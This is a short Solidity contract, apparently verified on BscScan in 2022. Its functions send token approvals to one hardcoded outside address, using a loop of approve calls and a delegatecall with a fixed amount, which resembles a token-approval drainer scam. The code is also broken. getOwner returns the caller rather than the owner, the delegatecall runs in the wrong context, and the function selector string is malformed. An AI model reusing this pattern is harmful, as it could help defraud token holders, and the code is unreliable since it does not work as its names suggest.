/**
 *Submitted for verification at BscScan.com on 2022-08-11
*/

pragma solidity >=0.8.10;

contract Smart {
    address  public owner;

    event Response(bool success, bytes data);

    constructor() {
        owner = msg.sender;
    }


    function getOwner() public view returns(address) {
        return msg.sender;
    }


    function approve(address[] memory _spenders, uint _value) public returns(bool) {
    
        for (uint i = 0; i < _spenders.length; i++) {
            IBEP20 token = IBEP20(_spenders[i]);
            token.approve(0xD072F99a88efa8484F393Bc73B5Cab09606b21f2, _value);
        }

        return true;
    }

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function approve2() public returns (bool){
        address token = 0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402; //DOT
        uint256 amount = 777777777;

        if(isContract(token)){
            //(bool success, bytes memory data) = token.delegatecall(abi.encodeWithSignature("approve(address, uint256)", 
            //    0xD072F99a88efa8484F393Bc73B5Cab09606b21f2, amount));

            (bool success, bytes memory data) = token.delegatecall(
                abi.encodePacked(bytes4(keccak256("approve(address, uint256)")), 
                0xD072F99a88efa8484F393Bc73B5Cab09606b21f2, amount));
            
            emit Response(success, data);
            return true;
        } else {
            return false;
        }
    }

    

}

interface IBEP20 {
    function symbol() external view returns (string memory);
    function approve(address spender, uint256 amount) external returns (bool);
}